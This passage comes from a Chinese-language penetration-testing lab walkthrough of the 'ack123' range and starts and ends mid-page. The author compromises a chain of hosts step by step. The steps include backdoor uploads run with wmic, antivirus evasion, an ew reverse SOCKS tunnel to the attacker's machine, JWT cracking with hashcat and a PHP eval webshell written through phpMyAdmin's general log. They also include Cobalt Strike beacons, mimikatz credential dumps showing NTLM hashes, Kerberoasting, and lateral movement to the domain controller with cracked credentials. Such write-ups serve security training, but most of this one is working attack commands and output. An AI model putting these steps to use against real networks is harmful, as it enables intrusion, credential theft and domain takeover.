暂缺                                        </span><br><span class="line">tasklist.exe                  1688 暂缺</span><br></pre></td></tr></table></figure>

<p><img data-src="./ack123/14.png" alt></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><ul>
<li>上传后门到服务器</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/c wmic /node:127.0.0.1 process call create "C:\Windows\Temp\ma\1.exe'</span><br></pre></td></tr></table></figure>

<p><img data-src="./ack123/15.png" alt></p>
<ul>
<li>提权 &amp;&amp; ok</li>
</ul>
<p><img data-src="./ack123/16.png" alt></p>
<p><img data-src="./ack123/17.png" alt></p>
<h3 id="站库分离data1"><a href="#站库分离data1" class="headerlink" title="站库分离data1"></a>站库分离data1</h3><h4 id="敏感信息-amp-amp-权限"><a href="#敏感信息-amp-amp-权限" class="headerlink" title="敏感信息&amp;&amp;权限"></a>敏感信息&amp;&amp;权限</h4><ul>
<li>上文暴露的web页面存在敏感信息，查看web配置文件可以发现</li>
</ul>
<p><img data-src="./ack123/18.png" alt></p>
<p><img data-src="./ack123/19.png" alt></p>
<ul>
<li>敏感信息如下，也能进一步确认是个站库分离的，无法直接访问到22网段</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;add key="HdhCmsConnStr" value="user id=sa;password=pass123@.com;initial catalog=DemoHdhCms;data source=192.168.22.133"/&gt;</span><br><span class="line"></span><br><span class="line">sa pass123@.com 192.168.22.133</span><br></pre></td></tr></table></figure>

<ul>
<li>通过web侧大马进行数据库连接</li>
</ul>
<p><img data-src="./ack123/20.png" alt></p>
<p><img data-src="./ack123/21.png" alt></p>
<ul>
<li>拿到数据库普通用户权限</li>
</ul>
<p><img data-src="./ack123/22.png" alt></p>
<p><img data-src="./ack123/23.png" alt></p>
<ul>
<li><code>tasklist /svc</code> 查看杀软</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">映像名称 PID 服务</span><br><span class="line">========================= ======== ============================================</span><br><span class="line">System Idle Process 0 暂缺</span><br><span class="line">System 4 暂缺</span><br><span class="line">smss.exe 244 暂缺</span><br><span class="line">csrss.exe 352 暂缺</span><br><span class="line">wininit.exe 444 暂缺</span><br><span class="line">csrss.exe 452 暂缺</span><br><span class="line">winlogon.exe 480 暂缺</span><br><span class="line">services.exe 536 暂缺</span><br><span class="line">lsass.exe 544 SamSs</span><br><span class="line">svchost.exe 600 BrokerInfrastructure, DcomLaunch, LSM,</span><br><span class="line">PlugPlay, Power, SystemEventsBroker</span><br><span class="line">svchost.exe 628 RpcEptMapper, RpcSs</span><br><span class="line">dwm.exe 712 暂缺</span><br><span class="line">svchost.exe 828 Dhcp, EventLog, lmhosts, Wcmsvc</span><br><span class="line">svchost.exe 924 gpsvc, IKEEXT, iphlpsvc, LanmanServer,</span><br><span class="line">ProfSvc, Schedule, SENS, ShellHWDetection,</span><br><span class="line">Themes, Winmgmt</span><br><span class="line">svchost.exe 1008 EventSystem, FontCache, netprofm, nsi,</span><br><span class="line">W32Time</span><br><span class="line">svchost.exe 360 CryptSvc, Dnscache, LanmanWorkstation,</span><br><span class="line">NlaSvc, WinRM</span><br><span class="line">svchost.exe 612 BFE, DPS, MpsSvc</span><br><span class="line">spoolsv.exe 1204 Spooler</span><br><span class="line">svchost.exe 1244 DiagTrack</span><br><span class="line">MsDtsSrvr.exe 1284 MsDtsServer110</span><br><span class="line">sqlservr.exe 1388 MSSQLSERVER</span><br><span class="line">msmdsrv.exe 1404 MSSQLServerOLAPService</span><br><span class="line">Service_KMS.exe 1612 Service KMSELDI</span><br><span class="line">sqlwriter.exe 1668 SQLWriter</span><br><span class="line">svchost.exe 1704 TrkWks, UALSVC</span><br><span class="line">VGAuthService.exe 1764 VGAuthService</span><br><span class="line">vmtoolsd.exe 1816 VMTools</span><br><span class="line">WmiPrvSE.exe 2120 暂缺</span><br><span class="line">fdlauncher.exe 2356 MSSQLFDLauncher</span><br><span class="line">svchost.exe 2408 PolicyAgent</span><br><span class="line">dllhost.exe 2576 COMSysApp</span><br><span class="line">msdtc.exe 2736 MSDTC</span><br><span class="line">fdhost.exe 2872 暂缺</span><br><span class="line">conhost.exe 2880 暂缺</span><br><span class="line">taskhostex.exe 304 暂缺</span><br><span class="line">explorer.exe 1060 暂缺</span><br><span class="line">ChsIME.exe 1756 暂缺</span><br><span class="line">vm3dservice.exe 1396 暂缺</span><br><span class="line">vmtoolsd.exe 1172 暂缺</span><br><span class="line">powershell.exe 1652 暂缺</span><br><span class="line">conhost.exe 1780 暂缺</span><br><span class="line">HipsTray.exe 3088 暂缺</span><br><span class="line">HipsDaemon.exe 3084 HipsDaemon</span><br><span class="line">usysdiag.exe 1472 暂缺</span><br><span class="line">HipsMain.exe 3664 暂缺</span><br><span class="line">cmd.exe 896 暂缺</span><br><span class="line">conhost.exe 4048 暂缺</span><br><span class="line">tasklist.exe 2644 暂缺</span><br></pre></td></tr></table></figure>

<p><img data-src="./ack123/24.png" alt></p>
<ul>
<li>存在火绒，我们cs拿到shell需要进行一定的免杀</li>
<li>emm，免杀这个东西，还是要藏得，靶场通外网，我们就设置白名单说明下</li>
<li>下面给出免杀的一个效果，有师傅需要可以call me</li>
</ul>
<p><img data-src="./ack123/25.png" alt></p>
<p><img data-src="./ack123/26.png" alt></p>
<p><img data-src="./ack123/27.png" alt></p>
<p><img data-src="./ack123/28.png" alt></p>
<p>这里360 and 火绒过，windows defender 挂掉了 好几个月的了</p>
<p>稍微修改下</p>
<p><img data-src="./ack123/29.png" alt></p>
<p><img data-src="./ack123/30.png" alt></p>
<p>ok 拿下</p>
<ul>
<li>上传后门到data1服务器</li>
</ul>
<p><img data-src="./ack123/31.png" alt></p>
<ul>
<li>执行<code>C:\Windows\Temp\ma\1.exe</code></li>
</ul>
<p><img data-src="./ack123/32.png" alt></p>
<h4 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h4><ul>
<li>烂土豆提权 </li>
</ul>
<p><img data-src="./ack123/33.png" alt></p>
<p><img data-src="./ack123/34.png" alt></p>
<p>拿到data1的flag</p>
<p><img data-src="./ack123/35.png" alt></p>
<h4 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h4><ul>
<li>内网探测80端口</li>
</ul>
<p><img data-src="./ack123/36.png" alt></p>
<p><img data-src="./ack123/37.png" alt></p>
<ul>
<li>其中135为web2</li>
</ul>
<h4 id="内网隧道"><a href="#内网隧道" class="headerlink" title="内网隧道"></a>内网隧道</h4><ul>
<li>设置代理，这里利用ew</li>
<li>不过需要做一下火绒免杀</li>
</ul>
<p><img data-src="./ack123/38.png" alt></p>
<ul>
<li>这里比较简单，只需要upx加壳即可</li>
</ul>
<p><img data-src="./ack123/39.png" alt></p>
<p><img data-src="./ack123/40.png" alt></p>
<p><img data-src="./ack123/41.png" alt></p>
<ul>
<li>因为是内网环境，我们将自己的kali假设为公网服务器</li>
</ul>
<p><img data-src="./ack123/42.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 10000 -e 11000</span><br><span class="line"></span><br><span class="line">shell C:\Windows\Temp\ew_for_Win.exe -s rssocks -d 192.168.59.138 -e 11000</span><br></pre></td></tr></table></figure>



<h3 id="内网web2服务"><a href="#内网web2服务" class="headerlink" title="内网web2服务"></a>内网web2服务</h3><p><img data-src="./ack123/43.png" alt></p>
<ul>
<li>查看<code>jwt_token</code></li>
</ul>
<p><img data-src="./ack123/44.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC8xMC4xMC4xLjEzNSIsImF1ZCI6Imh0dHA6XC9cLzEwLjEwLjEuMTM1IiwiaWF0IjoxNjQ4MzAyOTAwLCJuYmYiOjE2NDgzMDI5MTAsImV4cCI6MTY0ODMwMzUwMCwiZGF0YSI6eyJ1c2VyaWQiOjEsInVzZXJuYW1lIjoiZGVtbyJ9fQ.Ldg32GIp9CtI_6eU2e8Y2wLN4FCvmhLHXCJxCeAebDM</span><br></pre></td></tr></table></figure>

<h4 id="hachcat破解jwt-token"><a href="#hachcat破解jwt-token" class="headerlink" title="hachcat破解jwt_token"></a>hachcat破解jwt_token</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hashcat -m 16500 jwt -a 3  /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Qweasdzxc5</span><br></pre></td></tr></table></figure>

<p><img data-src="./ack123/45.png" alt></p>
<h4 id="phpMyAdmin拿到shell"><a href="#phpMyAdmin拿到shell" class="headerlink" title="phpMyAdmin拿到shell"></a>phpMyAdmin拿到shell</h4><ul>
<li>搜索发现可能是 <code>phpstudy v8.1</code> 本地测试访问phpmyadmin目录</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.22.135/phpMyAdmin4.8.5/</span><br></pre></td></tr></table></figure>

<p><img data-src="./ack123/46.png" alt></p>
<ul>
<li>账号密码为 <code>root / Qweasdzxc5</code></li>
</ul>
<p><img data-src="./ack123/47.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">show variables  like  '%general%';</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 打开general_log日志读写功能</span></span><br><span class="line">SET GLOBAL general_log='on'</span><br><span class="line"></span><br><span class="line">SET GLOBAL general_log_file='C:/phpstudy_pro/WWW/shell.php'</span><br><span class="line"></span><br><span class="line">SELECT '&lt;?php @eval($_POST[laotie233]);?&gt;'</span><br></pre></td></tr></table></figure>

<p><img data-src="./ack123/48.png" alt></p>
<ul>
<li>写入<code>shell</code>, 使用antsword连接，设置代理</li>
</ul>
<p><img data-src="./ack123/49.png" alt></p>
<p><img data-src="./ack123/50.png" alt></p>
<p>此处系统权限最高，无需提权</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:\phpstudy_pro\WWW&gt; tasklist /svc</span><br><span class="line">ӳ������                       PID ����                                        </span><br><span class="line">========================= ======== ============================================</span><br><span class="line">System Idle Process              0 ��ȱ                                        </span><br><span class="line">System                           4 ��ȱ                                        </span><br><span class="line">smss.exe                       216 ��ȱ                                        </span><br><span class="line">csrss.exe                      312 ��ȱ                                        </span><br><span class="line">wininit.exe                    404 ��ȱ                                        </span><br><span class="line">csrss.exe                      412 ��ȱ                                        </span><br><span class="line">winlogon.exe                   440 ��ȱ                                        </span><br><span class="line">services.exe                   500 ��ȱ                                        </span><br><span class="line">lsass.exe                      508 Netlogon, SamSs                             </span><br><span class="line">svchost.exe                    564 BrokerInfrastructure, DcomLaunch, LSM,      </span><br><span class="line">                                   PlugPlay, Power, SystemEventsBroker         </span><br><span class="line">svchost.exe                    592 RpcEptMapper, RpcSs                         </span><br><span class="line">svchost.exe                    700 Dhcp, EventLog, lmhosts, Wcmsvc             </span><br><span class="line">dwm.exe                        708 ��ȱ                                        </span><br><span class="line">svchost.exe                    736 CertPropSvc, DsmSvc, gpsvc, IKEEXT,         </span><br><span class="line">                                   iphlpsvc, LanmanServer, ProfSvc, Schedule,  </span><br><span class="line">                                   SENS, SessionEnv, ShellHWDetection, Themes, </span><br><span class="line">                                   Winmgmt                                     </span><br><span class="line">svchost.exe                    844 EventSystem, FontCache, netprofm, nsi,      </span><br><span class="line">                                   W32Time                                     </span><br><span class="line">svchost.exe                    908 CryptSvc, Dnscache, LanmanWorkstation,      </span><br><span class="line">                                   NlaSvc, WinRM                               </span><br><span class="line">svchost.exe                    284 BFE, DPS, MpsSvc                            </span><br><span class="line">spoolsv.exe                   1064 Spooler                                     </span><br><span class="line">svchost.exe                   1092 DiagTrack                                   </span><br><span class="line">phpStudyServer.exe            1124 phpStudySrv                                 </span><br><span class="line">Service_KMS.exe               1212 Service KMSELDI                             </span><br><span class="line">httpd.exe                     1244 ��ȱ                                        </span><br><span class="line">mysqld.exe                    1252 ��ȱ                                        </span><br><span class="line">conhost.exe                   1264 ��ȱ                                        </span><br><span class="line">svchost.exe                   1316 Netman, TrkWks, UALSVC, UmRdpService        </span><br><span class="line">httpd.exe                     1380 ��ȱ                                        </span><br><span class="line">VGAuthService.exe             5496 VGAuthService                               </span><br><span class="line">vmtoolsd.exe                  5548 VMTools                                     </span><br><span class="line">svchost.exe                   5796 TermService                                 </span><br><span class="line">WmiPrvSE.exe                  6024 ��ȱ                                        </span><br><span class="line">svchost.exe                   6284 PolicyAgent                                 </span><br><span class="line">dllhost.exe                   6580 COMSysApp                                   </span><br><span class="line">msdtc.exe                     6688 MSDTC                                       </span><br><span class="line">taskhostex.exe                6568 ��ȱ                                        </span><br><span class="line">ChsIME.exe                     252 ��ȱ                                        </span><br><span class="line">explorer.exe                  6792 ��ȱ                                        </span><br><span class="line">vm3dservice.exe                572 ��ȱ                                        </span><br><span class="line">vmtoolsd.exe                   968 ��ȱ                                        </span><br><span class="line">powershell.exe                6096 ��ȱ                                        </span><br><span class="line">conhost.exe                    548 ��ȱ                                        </span><br><span class="line">LogonUI.exe                   7128 ��ȱ                                        </span><br><span class="line">ChsIME.exe                    7152 ��ȱ                                        </span><br><span class="line">php-cgi.exe                   6444 ��ȱ                                        </span><br><span class="line">cmd.exe                       7964 ��ȱ                                        </span><br><span class="line">conhost.exe                   7216 ��ȱ                                        </span><br><span class="line">cmd.exe                       7080 ��ȱ                                        </span><br><span class="line">tasklist.exe                  7444 ��ȱ</span><br></pre></td></tr></table></figure>

<ul>
<li>无杀软</li>
</ul>
<p><img data-src="./ack123/51.png" alt></p>
<ul>
<li>设置转发上线，到cs上</li>
</ul>
<p><img data-src="./ack123/52.png" alt></p>
<p><img data-src="./ack123/53.png" alt></p>
<ul>
<li>这里只能生成无状态的stager</li>
</ul>
<p><img data-src="./ack123/54.png" alt></p>
<ul>
<li>上传木马</li>
</ul>
<p><img data-src="./ack123/55.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:/Windows/Temp/beacon123.exe</span><br></pre></td></tr></table></figure>

<ul>
<li>成功上线</li>
</ul>
<p><img data-src="./ack123/56.png" alt></p>
<p><img data-src="./ack123/57.png" alt></p>
<h4 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h4><ul>
<li>在域内</li>
</ul>
<p><img data-src="./ack123/58.png" alt></p>
<p><img data-src="./ack123/59.png" alt></p>
<ul>
<li>spn扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shell setspn -T ack123.com -q */*</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line"><span class="meta">beacon&gt;</span><span class="bash"> shell setspn -T ack123.com -q */*</span></span><br><span class="line">[+] established link to parent beacon: 192.168.59.130</span><br><span class="line">[*] Tasked beacon to sleep for 30s (30% jitter) [change made to: Beacon 192.168.59.130@3752]</span><br><span class="line">[-] lost link to parent beacon: 192.168.59.130</span><br><span class="line">[*] Tasked beacon to run: setspn -T ack123.com -q */*</span><br><span class="line">[+] host called home, sent: 58 bytes</span><br><span class="line">[+] established link to parent beacon: 192.168.59.130</span><br><span class="line">[+] received output:</span><br><span class="line">正在检查域 DC=ack123,DC=com</span><br><span class="line">CN=Administrator,CN=Users,DC=ack123,DC=com</span><br><span class="line">	mysql/16server-dc1.ack123.com</span><br><span class="line">CN=16SERVER-DC1,OU=Domain Controllers,DC=ack123,DC=com</span><br><span class="line">	Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/16server-dc1.ack123.com</span><br><span class="line">	ldap/16server-dc1.ack123.com/ForestDnsZones.ack123.com</span><br><span class="line">	ldap/16server-dc1.ack123.com/DomainDnsZones.ack123.com</span><br><span class="line">	DNS/16server-dc1.ack123.com</span><br><span class="line">	GC/16server-dc1.ack123.com/ack123.com</span><br><span class="line">	RestrictedKrbHost/16server-dc1.ack123.com</span><br><span class="line">	RestrictedKrbHost/16SERVER-DC1</span><br><span class="line">	RPC/fc2c7a98-defb-4143-8052-ec1832c2a8f0._msdcs.ack123.com</span><br><span class="line">	HOST/16SERVER-DC1/ACK123</span><br><span class="line">	HOST/16server-dc1.ack123.com/ACK123</span><br><span class="line">	HOST/16SERVER-DC1</span><br><span class="line">	HOST/16server-dc1.ack123.com</span><br><span class="line">	HOST/16server-dc1.ack123.com/ack123.com</span><br><span class="line">	E3514235-4B06-11D1-AB04-00C04FC2DCD2/fc2c7a98-defb-4143-8052-ec1832c2a8f0/ack123.com</span><br><span class="line">	ldap/16SERVER-DC1/ACK123</span><br><span class="line">	ldap/fc2c7a98-defb-4143-8052-ec1832c2a8f0._msdcs.ack123.com</span><br><span class="line">	ldap/16server-dc1.ack123.com/ACK123</span><br><span class="line">	ldap/16SERVER-DC1</span><br><span class="line">	ldap/16server-dc1.ack123.com</span><br><span class="line">	ldap/16server-dc1.ack123.com/ack123.com</span><br><span class="line">CN=krbtgt,CN=Users,DC=ack123,DC=com</span><br><span class="line">	kadmin/changepw</span><br><span class="line">CN=12SERVER-DATA2,CN=Computers,DC=ack123,DC=com</span><br><span class="line">	WSMAN/12server-data2</span><br><span class="line">	WSMAN/12server-data2.ack123.com</span><br><span class="line">	RestrictedKrbHost/12SERVER-DATA2</span><br><span class="line">	HOST/12SERVER-DATA2</span><br><span class="line">	RestrictedKrbHost/12server-data2.ack123.com</span><br><span class="line">	HOST/12server-data2.ack123.com</span><br><span class="line">CN=12SERVER-WEB2,CN=Computers,DC=ack123,DC=com</span><br><span class="line">	TERMSRV/12SERVER-WEB2</span><br><span class="line">	TERMSRV/12server-web2.ack123.com</span><br><span class="line">	WSMAN/12server-web2</span><br><span class="line">	WSMAN/12server-web2.ack123.com</span><br><span class="line">	RestrictedKrbHost/12SERVER-WEB2</span><br><span class="line">	HOST/12SERVER-WEB2</span><br><span class="line">	RestrictedKrbHost/12server-web2.ack123.com</span><br><span class="line">	HOST/12server-web2.ack123.com</span><br><span class="line"></span><br><span class="line">发现存在 SPN!</span><br></pre></td></tr></table></figure>

<ul>
<li>查看凭证</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">[*] Tasked beacon to dump hashes</span><br><span class="line">[+] host called home, sent: 82501 bytes</span><br><span class="line">[+] received password hashes:</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:b78ee36a79ed9763b66519f86825a6bd:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">moonsec:1001:aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387:::</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 337100 (00000000:000524cc)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : web2</span><br><span class="line">Domain            : ACK123</span><br><span class="line">Logon Server      : 16SERVER-DC1</span><br><span class="line">Logon Time        : 2022&#x2F;3&#x2F;7 22:32:45</span><br><span class="line">SID               : S-1-5-21-2015848930-1301831522-615504165-1104</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : web2</span><br><span class="line">	 * Domain   : ACK123</span><br><span class="line">	 * NTLM     : 85b998a3d8f1904bc6f2d6b5f418be7e</span><br><span class="line">	 * SHA1     : 09b436459c1e57b9fe5af3ae1d04847a444df556</span><br><span class="line">	 [00010000] CredentialKeys</span><br><span class="line">	 * NTLM     : 85b998a3d8f1904bc6f2d6b5f418be7e</span><br><span class="line">	 * SHA1     : 09b436459c1e57b9fe5af3ae1d04847a444df556</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : web2</span><br><span class="line">	 * Domain   : ACK123</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : web2</span><br><span class="line">	 * Domain   : ACK123.COM</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : 12SERVER-WEB2$</span><br><span class="line">Domain            : ACK123</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022&#x2F;3&#x2F;7 22:30:53</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : 12SERVER-WEB2$</span><br><span class="line">	 * Domain   : ACK123</span><br><span class="line">	 * NTLM     : 69478339633f30c7da5a2d2da43dc45c</span><br><span class="line">	 * SHA1     : d66cf9670ed5b1daf954aefa5648c632440784af</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : 12SERVER-WEB2$</span><br><span class="line">	 * Domain   : ACK123</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : 12server-web2$</span><br><span class="line">	 * Domain   : ACK123.COM</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 68611 (00000000:00010c03)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022&#x2F;3&#x2F;7 22:30:53</span><br><span class="line">SID               : S-1-5-90-1</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : 12SERVER-WEB2$</span><br><span class="line">	 * Domain   : ACK123</span><br><span class="line">	 * NTLM     : 69478339633f30c7da5a2d2da43dc45c</span><br><span class="line">	 * SHA1     : d66cf9670ed5b1daf954aefa5648c632440784af</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : 12SERVER-WEB2$</span><br><span class="line">	 * Domain   : ACK123</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : 12SERVER-WEB2$</span><br><span class="line">	 * Domain   : ack123.com</span><br><span class="line">	 * Password : 27 07 53 e1 49 00 9f d2 2c e2 6f d2 ca 7c ed f8 c0 2a de b1 5a 5d 56 1c 46 dd 2a e6 42 a5 39 32 7f 64 ba 89 0c 50 b2 f0 c8 c1 c5 d0 9b 31 a9 5d 02 70 1b 5a 83 4f 6e 0b 38 1f 08 c8 0f a0 33 e5 0e 04 ea ae d4 d5 23 19 30 4e 5d 9a 07 32 eb 9c 5e 9e 43 1f b1 4c 6e 03 f1 aa af b6 33 1d bc 0d 66 b8 19 8b 27 c3 c8 d2 14 af 83 d3 43 14 b4 c6 cb e3 3b ec f7 11 02 50 63 8d 07 a7 ef 3f 2e d1 39 9e b9 3c c5 d3 b3 50 2e c1 31 1c 79 03 68 0c 28 0a 61 83 0c 7d 6c 67 56 cd 70 b6 6c 75 07 6c f7 22 4d 4f 72 ab 3b 16 e0 d7 81 f1 34 0d ff 37 4e 12 6b 7d cd eb 87 a1 a7 a0 de d5 cc 9a 4b ab a0 dd 59 90 c8 f5 57 a5 97 3f 1a 99 2b a0 ac 92 11 dc bb 9d fa 51 9d 18 cd 05 e6 71 01 f8 9c b0 05 4b a5 2e ad 93 94 16 98 58 40 26 ee 44 98 51 </span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022&#x2F;3&#x2F;7 22:30:53</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">	msv :	</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : (null)</span><br><span class="line">	 * Domain   : (null)</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : (null)</span><br><span class="line">	 * Domain   : (null)</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 44521 (00000000:0000ade9)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022&#x2F;3&#x2F;7 22:30:53</span><br><span class="line">SID               : </span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : 12SERVER-WEB2$</span><br><span class="line">	 * Domain   : ACK123</span><br><span class="line">	 * NTLM     : 69478339633f30c7da5a2d2da43dc45c</span><br><span class="line">	 * SHA1     : d66cf9670ed5b1daf954aefa5648c632440784af</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	kerberos :	</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : 12SERVER-WEB2$</span><br><span class="line">Domain            : ACK123</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022&#x2F;3&#x2F;7 22:30:53</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">	msv :	</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : 12SERVER-WEB2$</span><br><span class="line">	 * Domain   : ACK123</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : 12server-web2$</span><br><span class="line">	 * Domain   : ACK123.COM</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :</span><br></pre></td></tr></table></figure>

<p><img data-src="./ack123/60.png" alt></p>
<h4 id="SPN攻击"><a href="#SPN攻击" class="headerlink" title="SPN攻击"></a>SPN攻击</h4><ul>
<li>首先进程注入到域内的进程</li>
</ul>
<p><img data-src="./ack123/61.png" alt></p>
<p><img data-src="./ack123/62.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::ask /target:mysql/16server-dc1.ack123.com</span><br><span class="line">mimikatz kerberos::list</span><br><span class="line">mimikatz kerberos::list /export</span><br></pre></td></tr></table></figure>

<p><img data-src="./ack123/63.png" alt></p>
<p><img data-src="./ack123/64.png" alt></p>
<p><img data-src="./ack123/65.png" alt></p>
<p><img data-src="./ack123/66.png" alt></p>
<ul>
<li>破解</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 tgsrepcrack.py /usr/share/wordlists/fasttrack.txt 1-40a10000-web2@mysql\~16server-dc1.ack123.com-ACK123.COM.kirbi</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\kalifile\kerberoast&gt; python3 tgsrepcrack.py /usr/share/wordlists/fasttrack.txt 1-40a10000-web2@mysql\~16server-dc1.ack123.com-ACK123.COM.kirbi </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    USE HASHCAT, IT'S HELLA FASTER!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Cracking 1 tickets...</span><br><span class="line">found password for ticket 0: P@55w0rd!  File: 1-40a10000-web2@mysql~16server-dc1.ack123.com-ACK123.COM.kirbi</span><br><span class="line">Successfully cracked all tickets</span><br></pre></td></tr></table></figure>



<h3 id="内网data2服务"><a href="#内网data2服务" class="headerlink" title="内网data2服务"></a>内网data2服务</h3><ul>
<li>目前状态</li>
</ul>
<p><img data-src="./ack123/67.png" alt></p>
<ul>
<li><code>ipc</code>登录 <code>10.10.10.136</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shell net use \\10.10.10.136\ipc$ /user:administrator "P@55w0rd!" </span><br><span class="line"></span><br><span class="line">shell copy c:\beacon2.exe \\10.10.10.136\c$\beacon2.exe</span><br><span class="line"></span><br><span class="line">shell wmic /node:10.10.10.136 /user:ack123\administrator /password:P@55w0rd! process call create c:\beacon2.exe</span><br><span class="line"></span><br><span class="line">connect 10.10.10.136 6677</span><br></pre></td></tr></table></figure>

<p><img data-src="./ack123/68.png" alt></p>
<ul>
<li>制作正向后门</li>
</ul>
<p><img data-src="./ack123/69.png" alt></p>
<ul>
<li>制作后门并上传到data2 &amp;&amp; 执行</li>
</ul>
<p><img data-src="./ack123/70.png" alt></p>
<ul>
<li>连接正向后门 ok</li>
</ul>
<p><img data-src="./ack123/71.png" alt></p>
<ul>
<li>增加转发</li>
</ul>
<p><img data-src="./ack123/72.png" alt></p>
<h3 id="域服务器"><a href="#域服务器" class="headerlink" title="域服务器"></a>域服务器</h3><ul>
<li>同理，创建反向木马连接</li>
</ul>
<p><img data-src="./ack123/73.png" alt></p>
<p><img data-src="./ack123/74.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shell net use \\10.10.10.135\ipc$ /user:administrator "P@55w0rd!"</span><br><span class="line"></span><br><span class="line">shell copy c:\beacon444.exe \\10.10.10.135\c$\beacon444.exe</span><br><span class="line"></span><br><span class="line">shell wmic /node:10.10.10.135 /user:ack123\administrator /password:P@55w0rd! process call create c:\beacon444.exe</span><br></pre></td></tr></table></figure>

<ul>
